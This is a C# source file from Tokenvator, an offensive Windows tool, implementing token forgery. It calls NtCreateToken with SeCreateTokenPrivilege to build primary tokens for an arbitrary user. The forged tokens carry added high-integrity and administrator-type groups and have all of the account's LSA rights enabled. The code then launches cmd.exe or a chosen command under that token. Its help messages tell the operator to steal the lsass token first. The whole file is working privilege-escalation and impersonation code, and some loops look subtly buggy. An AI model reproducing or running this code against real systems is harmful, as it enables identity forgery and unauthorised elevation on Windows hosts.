using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

using Tokenvator.Resources;
using Tokenvator.Plugins.Enumeration;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;
using System.Security.Principal;

namespace Tokenvator.Plugins.AccessTokens
{
    //https://stackoverflow.com/questions/21716527/in-windows-how-do-you-programatically-launch-a-process-in-administrator-mode-un/21718198#21718198

    class CreateTokens : AccessTokens
    {
        private uint localEntriesRead = 0;
        private uint localTotalEntriesRead = 0;

        private uint globalEntriesRead = 0;
        private uint globalEotalEntriesRead = 0;

        private int extraGroups = 0;

        public CreateTokens(IntPtr token) : base(token)
        {
            SetWorkingTokenToSelf();
        }

        //SeCreateTokenPrivilege
        public void CreateToken(string[] groups, string command)
        {
            if (!_CheckPrivileges())
            {
                return;
            }

            uint LG_INCLUDE_INDIRECT = 0x0001;
            uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;

            Console.WriteLine();
            Console.WriteLine("_SECURITY_QUALITY_OF_SERVICE");
            Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
            {
                Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,//SecurityAnonymous
                ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
            };

            IntPtr hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
            Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);

            Console.WriteLine("_OBJECT_ATTRIBUTES");
            wudfwdm._OBJECT_ATTRIBUTES objectAttributes = new wudfwdm._OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(wudfwdm._OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                Attributes = 0,
                ObjectName = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = hSecurityContextTrackingMode
            };

            TokenInformation ti = new TokenInformation(hWorkingToken);
            ti.SetWorkingTokenToSelf();

            ti.GetTokenSource();
            ti.GetTokenUser();
            ti.GetTokenGroups();
            ti.GetTokenPrivileges();
            ti.GetTokenOwner();
            ti.GetTokenPrimaryGroup();
            ti.GetTokenDefaultDacl();

            Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
            long expirationTime = long.MaxValue / 2;

            phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));

            //out/ref hToken - required
            //Ref Expirationtime - required
            uint ntRetVal = ntdll.NtCreateToken(
                out phNewToken,
                Winnt.TOKEN_ALL_ACCESS,
                ref objectAttributes,
                Winnt._TOKEN_TYPE.TokenPrimary,
                ref systemLuid,
                ref expirationTime,
                ref ti.tokenUser,
                ref ti.tokenGroups,
                ref ti.tokenPrivileges,
                ref ti.tokenOwner,
                ref ti.tokenPrimaryGroup,
                ref ti.tokenDefaultDacl,
                ref ti.tokenSource
            );

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtCreateToken", ntRetVal);
                new TokenInformation(phNewToken).GetTokenUser();
            }

            if (string.IsNullOrEmpty(command))
            {
                command = "cmd.exe";
            }

            SetWorkingTokenToNewToken();
            StartProcessAsUser(command);
        }

        //SeCreateTokenPrivilege
        public void CreateToken(string userName, string[] groups, string command)
        {
            Console.WriteLine("[*] Creating Token for {0}", userName);

            if (!_CheckPrivileges())
            {
                return;
            }
            
            uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;

            #region _OBJECT_ATTRIBUTES
            Console.WriteLine();
            Console.WriteLine("[*] _SECURITY_QUALITY_OF_SERVICE");
            Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
            {
                Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,//SecurityAnonymous
                ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
            };

            IntPtr hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
            Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);

            Console.WriteLine("[*] _OBJECT_ATTRIBUTES");
            wudfwdm._OBJECT_ATTRIBUTES objectAttributes = new wudfwdm._OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(wudfwdm._OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                Attributes = 0,
                ObjectName = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = hSecurityContextTrackingMode
            };
            #endregion

            string domain = string.Empty;
            if (userName.Contains(@"\"))
            {
                string[] split = userName.Split('\\');
                domain = split[0];
                userName = split[1];
            }

            Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
            long expirationTime = long.MaxValue / 2;
            Ntifs._TOKEN_USER tokenUser;
            CreateTokenUser(domain, userName, out tokenUser);

            Ntifs._TOKEN_GROUPS tokenGroups;
            Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup;
            CreateTokenGroups(domain, userName, out tokenGroups, out tokenPrimaryGroup, groups);

            Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges;
            CreateTokenPrivileges(tokenUser, tokenGroups, out tokenPrivileges);

            Ntifs._TOKEN_OWNER tokenOwner;
            CreateTokenOwner(domain, userName, out tokenOwner);

            Winnt._TOKEN_DEFAULT_DACL tokenDefaultDacl;
            CreateTokenDefaultDACL(out tokenDefaultDacl);

            Winnt._TOKEN_SOURCE tokenSource;
            CreateTokenSource(out tokenSource);

            phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));

            //out/ref hToken - required
            //Ref Expirationtime - required
            uint ntRetVal = ntdll.NtCreateToken(
                out phNewToken,
                Winnt.TOKEN_ALL_ACCESS,
                ref objectAttributes,
                Winnt._TOKEN_TYPE.TokenPrimary,
                ref systemLuid,
                ref expirationTime,
                ref tokenUser,
                ref tokenGroups,
                ref tokenPrivileges,
                ref tokenOwner,
                ref tokenPrimaryGroup,
                ref tokenDefaultDacl,
                ref tokenSource
            );

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtCreateToken", ntRetVal);
                return;
            }


            Console.WriteLine();

            DesktopACL desktop = new DesktopACL();
            desktop.OpenDesktop();
            desktop.OpenWindow();

            Console.WriteLine();

            if (string.IsNullOrEmpty(command))
            {
                command = "cmd.exe";
            }
            SetWorkingTokenToNewToken();
            StartProcessAsUser(command);         
        }

        private bool _CheckPrivileges()
        {
            bool exists, enabled;
            TokenInformation.CheckTokenPrivilege(hWorkingToken, Winnt.SE_CREATETOKEN_NAME, out exists, out enabled);
            if (!exists)
            {
                Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_CREATETOKEN_NAME);
                Console.WriteLine("[-] Steal_Token lsass cmd.exe");
                Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
                return false;
            }

            if (!enabled)
            {
                Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_CREATETOKEN_NAME);
                Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_CREATETOKEN_NAME);
                using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
                {
                    tm.SetWorkingTokenToSelf();
                    if (!tm.SetTokenPrivilege(Winnt.SE_CREATETOKEN_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
                    {
                        return false;   
                    }
                }
            }
            else
            {
                Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
            }

            TokenInformation.CheckTokenPrivilege(hWorkingToken, Winnt.SE_SECURITY_NAME, out exists, out enabled);
            if (!exists)
            {
                Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_SECURITY_NAME);
                Console.WriteLine("[-] This should be present on existing high integrity tokens");
                Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
                return false;
            }

            if (!enabled)
            {
                Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_SECURITY_NAME);
                Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_SECURITY_NAME);
                using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
                {
                    tm.SetWorkingTokenToSelf();
                    if (!tm.SetTokenPrivilege(Winnt.SE_SECURITY_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
                    {
                        return false;
                    }
                }
            }
            else
            {
                Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
            }

            return true;
        }

        private bool CreateTokenUser(string domain, string userName, out Ntifs._TOKEN_USER tokenUser)
        {
            Console.WriteLine("[*] Creating _TOKEN_USER");
            tokenUser = new Ntifs._TOKEN_USER();
            IntPtr hUserSid = IntPtr.Zero;
            if (!_LookupSid(domain, userName, ref hUserSid))
            {
                return false;
            }
            tokenUser.User.Sid = hUserSid;
            tokenUser.User.Attributes = 0;

            return true;
        }

        internal bool CreateTokenGroups(string domain, string userName, out Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup, string[] groups)
        {
            uint LG_INCLUDE_INDIRECT = 0x0001;

            Console.WriteLine("[*] _TOKEN_GROUPS");

            tokenGroups = new Ntifs._TOKEN_GROUPS();
            tokenGroups.Initialize();
            tokenPrimaryGroup = new Winnt._TOKEN_PRIMARY_GROUP();

            #region NetUserGetLocalGroups
            //Console.WriteLine(" - NetUserGetLocalGroups");

            lmaccess._LOCALGROUP_USERS_INFO_0[] localgroupUserInfo = new lmaccess._LOCALGROUP_USERS_INFO_0[0];
            IntPtr bufPtr;
            uint ntRetVal = netapi32.NetUserGetLocalGroups(
                domain,
                userName.ToLower(),
                0,
                LG_INCLUDE_INDIRECT,
                out bufPtr,
                -1,
                ref localEntriesRead,
                ref localTotalEntriesRead
            );

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NetUserGetLocalGroups", ntRetVal);
                Misc.GetNtError("[-] {0}", ntRetVal);
                //return false;
            }

            localgroupUserInfo = new lmaccess._LOCALGROUP_USERS_INFO_0[localEntriesRead];

            Console.WriteLine("[+] Local Groups: {0}", localEntriesRead);

            for (int i = 0; i < localEntriesRead; i++)
            {
                var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._LOCALGROUP_USERS_INFO_0)) * i));
                localgroupUserInfo[i] = (lmaccess._LOCALGROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._LOCALGROUP_USERS_INFO_0));
                Console.WriteLine(" [+] {0}", localgroupUserInfo[i].lgrui0_name);
            }
            #endregion

            #region NetUserGetGroups
            //Console.WriteLine(" - NetUserGetGroups");
            lmaccess._GROUP_USERS_INFO_0[] globalGroupUserInfo;// = new lmaccess._GROUP_USERS_INFO_0[0];
            ntRetVal = netapi32.NetUserGetGroups(
                domain,
                userName.ToLower(),
                0,
                out bufPtr,
                -1,
                ref globalEntriesRead,
                ref globalEotalEntriesRead
            );

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NetUserGetGroups", ntRetVal);
                Misc.GetNtError("[-] {0}", ntRetVal);
                //return false;
            }

            globalGroupUserInfo = new lmaccess._GROUP_USERS_INFO_0[globalEntriesRead];

            Console.WriteLine("[+] Global Groups: {0}", globalEntriesRead);

            for (int i = 0; i < localEntriesRead; i++)
            {
                var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._GROUP_USERS_INFO_0)) * i));
                globalGroupUserInfo[i] = (lmaccess._GROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._GROUP_USERS_INFO_0));
                Console.WriteLine(" [+] {0}", globalGroupUserInfo[i].grui0_name);
            }
            #endregion

            #region Default Admin Entries

            uint groupsAttributes = (uint)(Winnt.SE_GROUP_ENABLED | Winnt.SE_GROUP_ENABLED_BY_DEFAULT | Winnt.SE_GROUP_MANDATORY);

            /*
             * This works, but don't do it this way
            //Everyone
            _InitializeSid(Winnt.SECURITY_WORLD_SID_AUTHORITY, new uint[] { 0, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[0].Sid);
            tokenGroups.Groups[0].Attributes = groupsAttributes;
            */

            //Console.WriteLine("[+] Extra Groups");
            //Everyone
            InitializeSid("S-1-1-0", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //Administrators - Make this a flag
            InitializeSid("S-1-5-114", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //INTERACTIVE
            InitializeSid("S-1-5-4", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //CONSOLE LOGON
            InitializeSid("S-1-2-1", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //Authenticated Users
            InitializeSid("S-1-5-11", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //This Organization
            InitializeSid("S-1-5-15", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //Local account
            InitializeSid("S-1-5-113", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //LOCAL
            InitializeSid("S-1-2-0", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //NTLM Authentication
            InitializeSid("S-1-5-64-10", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //High Integrity Token
            InitializeSid("S-1-16-12288", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
            #endregion

            #region Custom Groups
            //Custom groups
            foreach (string group in groups)
            {
                string d = Environment.MachineName;
                string groupname = group;
                if (group.Contains(@"\"))
                {
                    string[] split = group.Split('\\');
                    d = split[0];
                    groupname = split[1];
                }
                string sid = new NTAccount(d, groupname).Translate(typeof(SecurityIdentifier)).Value;
                InitializeSid(sid, ref tokenGroups.Groups[extraGroups].Sid);
                tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
            }
            #endregion

            #region Local & Global Entries
            for (int i = 0; i < localEntriesRead; i++)
            {
                int offset = i + extraGroups;
                //Console.WriteLine("[*] Adding: {0}", localgroupUserInfo[i].lgrui0_name);
                if (!_LookupSid(string.Empty, localgroupUserInfo[i].lgrui0_name, ref tokenGroups.Groups[offset].Sid))
                {
                    return false;
                }
                tokenGroups.Groups[offset].Attributes = groupsAttributes;
            }

            for (int i = 0; i < globalEntriesRead; i++)
            {
                int offset = i + extraGroups + (int)localEntriesRead;
                //Console.WriteLine("[*] Adding: {0}", globalGroupUserInfo[i].grui0_name);
                if (!_LookupSid(string.Empty, globalGroupUserInfo[i].grui0_name, ref tokenGroups.Groups[offset].Sid))
                {
                    return false;
                }
                if (0 == i)
                {
                    tokenPrimaryGroup.PrimaryGroup = tokenGroups.Groups[offset].Sid;
                }

                tokenGroups.Groups[offset].Attributes = groupsAttributes;
            }
            #endregion

            tokenGroups.GroupCount = (int)(localEntriesRead + globalEntriesRead + extraGroups);

            Console.WriteLine("[*] Adding Groups");

            for (int i = 0; i < tokenGroups.GroupCount; i++)
            {
                string sid, account;
                TokenInformation._ReadSidAndName(tokenGroups.Groups[i].Sid, out sid, out account);
                Console.WriteLine(" ({0}) {1,-50} {2}", i, sid, account);
            }

            return true;
        }

        private bool CreateTokenPrivileges(Ntifs._TOKEN_USER tokenUser, Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges)
        {
            Console.WriteLine("[*] _TOKEN_PRIVILEGES");

            tokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY();

            //Console.WriteLine(" - LsaOpenPolicy");
            ntsecapi._LSA_UNICODE_STRING systemName = new ntsecapi._LSA_UNICODE_STRING();
            lsalookup._LSA_OBJECT_ATTRIBUTES lsaobjectAttributes = new lsalookup._LSA_OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(lsalookup._LSA_OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = new ntsecapi._LSA_UNICODE_STRING(),
                Attributes = 0,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            IntPtr hPolicyHandle = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            uint ntRetVal = advapi32.LsaOpenPolicy(
                ref systemName,
                ref lsaobjectAttributes,
                (uint)lsalookup.LSA_ACCESS_MASK.POLICY_ALL_ACCESS,
                out hPolicyHandle
            );
            if (0 != ntRetVal)
            {
                Misc.GetNtError("LsaOpenPolicy", ntRetVal);
                return false;
            }

            if (IntPtr.Zero == hPolicyHandle)
            {
                Misc.GetNtError("hPolicyHandle", ntRetVal);
                return false;
            }

            Dictionary<string, Winnt._LUID> rights = new Dictionary<string, Winnt._LUID>();

            _LookupRights(hPolicyHandle, tokenUser.User.Sid, ref rights);
            for (int i = 0; i < extraGroups + localEntriesRead + globalEntriesRead; i++)
            {
                _LookupRights(hPolicyHandle, tokenGroups.Groups[i].Sid, ref rights);
            }

            tokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY()
            {
                PrivilegeCount = (uint)rights.Keys.Count,
                Privileges = new Winnt._LUID_AND_ATTRIBUTES[35]
            };

            int j = 0;
            foreach (string priv in rights.Keys)
            {
                tokenPrivileges.Privileges[j].Luid = rights[priv];
                tokenPrivileges.Privileges[j].Attributes = Winnt.SE_PRIVILEGE_ENABLED;
                j++;
            }

            return true;
        }

        private bool CreateTokenOwner(string domain, string userName, out Ntifs._TOKEN_OWNER tokenOwner)
        {
            Console.WriteLine("[*] _TOKEN_OWNER");
            tokenOwner = new Ntifs._TOKEN_OWNER();
            IntPtr hOwnerSid = IntPtr.Zero;
            if (!_LookupSid(domain, userName, ref hOwnerSid))
            {
                return false;
            }
            tokenOwner.Owner = hOwnerSid;

            return true;
        }

        private bool CreateTokenPrimaryGroup(string firstLocalgroupUserInfo, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup)
        {
            Console.WriteLine("_TOKEN_PRIMARY_GROUP");
            tokenPrimaryGroup = new Winnt._TOKEN_PRIMARY_GROUP()
            {
                PrimaryGroup = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(System.IntPtr)))
            };
            

            if (!string.IsNullOrEmpty(firstLocalgroupUserInfo))
            {
                IntPtr hSid = IntPtr.Zero;
                _LookupSid(null, firstLocalgroupUserInfo, ref hSid);
                tokenPrimaryGroup = (Winnt._TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(hSid, typeof(Winnt._TOKEN_PRIMARY_GROUP));
            }
            else
            {
                //Everyone
                //Winnt.SECURITY_NULL_SID_AUTHORITY
                //InitializeSid(Winnt.SECURITY_NT_AUTHORITY, new uint[] { 32, 544, 0, 0, 0, 0, 0, 0 }, ref tokenPrimaryGroup.PrimaryGroup);
            }
            return true;
        }

        private bool CreateTokenDefaultDACL(out Winnt._TOKEN_DEFAULT_DACL tokenDefaultDacl)
        {
            Console.WriteLine("[*] _TOKEN_DEFAULT_DACL");
            tokenDefaultDacl = new Winnt._TOKEN_DEFAULT_DACL()
            {
                DefaultDacl = IntPtr.Zero
            };

            return true;
        }

        private bool CreateTokenSource(out Winnt._TOKEN_SOURCE tokenSource)
        {
            Console.WriteLine("[*] _TOKEN_SOURCE");
            tokenSource = new Winnt._TOKEN_SOURCE();
            uint ntRetVal = ntdll.NtAllocateLocallyUniqueId(ref tokenSource.SourceIdentifier);
            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtAllocateLocallyUniqueId", ntRetVal);
                return false;
            }

            return true;
        }

        private static bool _LookupRights(IntPtr hPolicyHandle, IntPtr sid, ref Dictionary<string, Winnt._LUID> rights)
        {

            //Console.WriteLine(" - LsaEnumerateAccountRights");
            IntPtr hUserRights;
            long countOfRights;
            uint ntRetVal = advapi32.LsaEnumerateAccountRights(
                hPolicyHandle,
                sid,
                out hUserRights,
                out countOfRights
            );

            //Weird Quirk
            countOfRights--;

            if (0 != ntRetVal)
            {
                //File Not Found - User Has No Rights Assigned
                //Parameter is incorrect - Not a valid SID lookup
                if (3221225524 == ntRetVal || 3221225485 == ntRetVal)
                {
                    return true;
                }

                Misc.GetLsaNtError("LsaEnumerateAccountRights", ntRetVal);
                return false;
            }

            Console.WriteLine("[+] Additional {0} privilege(s)", countOfRights);

            ntsecapi._LSA_UNICODE_STRING[] userRights = new ntsecapi._LSA_UNICODE_STRING[countOfRights];

            ////////////////////////////////////////////////////////////////////////////////
            ///
            ////////////////////////////////////////////////////////////////////////////////
            for (int i = 0; i < countOfRights; i++)
            {
                try
                {
                    userRights[i] = (ntsecapi._LSA_UNICODE_STRING)Marshal.PtrToStructure(new IntPtr(hUserRights.ToInt64() + (i * Marshal.SizeOf(typeof(ntsecapi._LSA_UNICODE_STRING)))), typeof(ntsecapi._LSA_UNICODE_STRING));
                    string privilege = Marshal.PtrToStringUni(userRights[i].Buffer);
                    Winnt._LUID luid = new Winnt._LUID();
                    bool retVal = advapi32.LookupPrivilegeValue(null, privilege, ref luid);
                    if (!retVal)
                    {
                        Console.WriteLine("[-] Privilege Not Found");
                        return false;
                    }
                    Console.WriteLine(" ({0}) {1}", i, privilege);
                    rights[privilege] = luid;

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    //return false;
                }
            }
            return true;
        }

        private static void _PrintStringSID(IntPtr hSid)
        {
            IntPtr hStringUserSid = IntPtr.Zero;
            advapi32.ConvertSidToStringSid(hSid, ref hStringUserSid);
            Console.WriteLine(Marshal.PtrToStringAuto(hStringUserSid));
        }

        ////////////////////////////////////////////////////////////////////////////////
        // SID Lookup Wrapper
        ////////////////////////////////////////////////////////////////////////////////
        private static bool _LookupSid(string logonDomain, string userName, ref IntPtr hSid)
        {

            StringBuilder lpSystemName = new StringBuilder(logonDomain);
            StringBuilder lpAccountName = new StringBuilder(userName);
            uint cbSid = 0;
            StringBuilder lpReferencedDomainName = new StringBuilder();
            uint cchReferencedDomainName = 0;
            Winnt._SID_NAME_USE peUse = new Winnt._SID_NAME_USE();

            //Console.WriteLine(" - LookupAccountName");
            advapi32.LookupAccountName(
                lpSystemName,
                lpAccountName,
                hSid,
                ref cbSid,
                lpReferencedDomainName,
                ref cchReferencedDomainName,
                out peUse
            );

            hSid = Marshal.AllocHGlobal((int)cbSid);
            lpReferencedDomainName.EnsureCapacity((int)cchReferencedDomainName);

            bool retVal = advapi32.LookupAccountName(
                lpSystemName,
                lpAccountName,
                hSid,
                ref cbSid,
                lpReferencedDomainName,
                ref cchReferencedDomainName,
                out peUse
            );

            if (!retVal)
            {
                Misc.GetWin32Error("LookupAccountName");
                return false;
            }

            IntPtr hStringUserSid = IntPtr.Zero;
            advapi32.ConvertSidToStringSid(hSid, ref hStringUserSid);
            string sddl = Marshal.PtrToStringAuto(hStringUserSid);
            Console.WriteLine(" [+] {0} {1}", sddl, lpAccountName.ToString());

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Wrapper for AllocateAndInitializeSid - Hardest Possible way of doing it
        ////////////////////////////////////////////////////////////////////////////////
        private static bool InitializeSid(Winnt._SID_IDENTIFIER_AUTHORITY authority, uint[] subAuthority, ref IntPtr psid)
        {
            //Console.WriteLine("AllocateAndInitializeSid");
            bool retVal = advapi32.AllocateAndInitializeSid(
                ref authority,
                1,
                subAuthority[0],
                subAuthority[1],
                subAuthority[2],
                subAuthority[3],
                subAuthority[4],
                subAuthority[5],
                subAuthority[6],
                subAuthority[7],
                out psid);

            if (!retVal)
            {
                Misc.GetWin32Error("AllocateAndInitializeSid");
                return false;
            }

            IntPtr hStringUserSid = IntPtr.Zero;
            advapi32.ConvertSidToStringSid(psid, ref hStringUserSid);
            string sddl = Marshal.PtrToStringAuto(hStringUserSid);
            string accountName = string.Empty;
            try
            {
                accountName = new System.Security.Principal.SecurityIdentifier(sddl)
                    .Translate(typeof(System.Security.Principal.NTAccount)).ToString();
            }
            catch (System.Security.Principal.IdentityNotMappedException ex)
            {
                Console.WriteLine(ex.Message);
            }

            Console.WriteLine("   - " + accountName + " " + sddl);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Wrapper for AllocateAndInitializeSid
        ////////////////////////////////////////////////////////////////////////////////
        public static bool InitializeSid(string sddl, ref IntPtr psid)
        {
            bool retVal = advapi32.ConvertStringSidToSidW(sddl, ref psid);

            if (!retVal)
            {
                Misc.GetWin32Error("ConvertStringSidToSidW");
                return false;
            }

            string accountName = string.Empty;
            try
            {
                accountName = new System.Security.Principal.SecurityIdentifier(sddl)
                    .Translate(typeof(System.Security.Principal.NTAccount)).ToString();
            }
            catch (System.Security.Principal.IdentityNotMappedException ex)
            {
                Console.WriteLine(ex.Message);
            }

            Console.WriteLine(" [+] {0} {1}", sddl, accountName);
            return true;
        }
    }
}
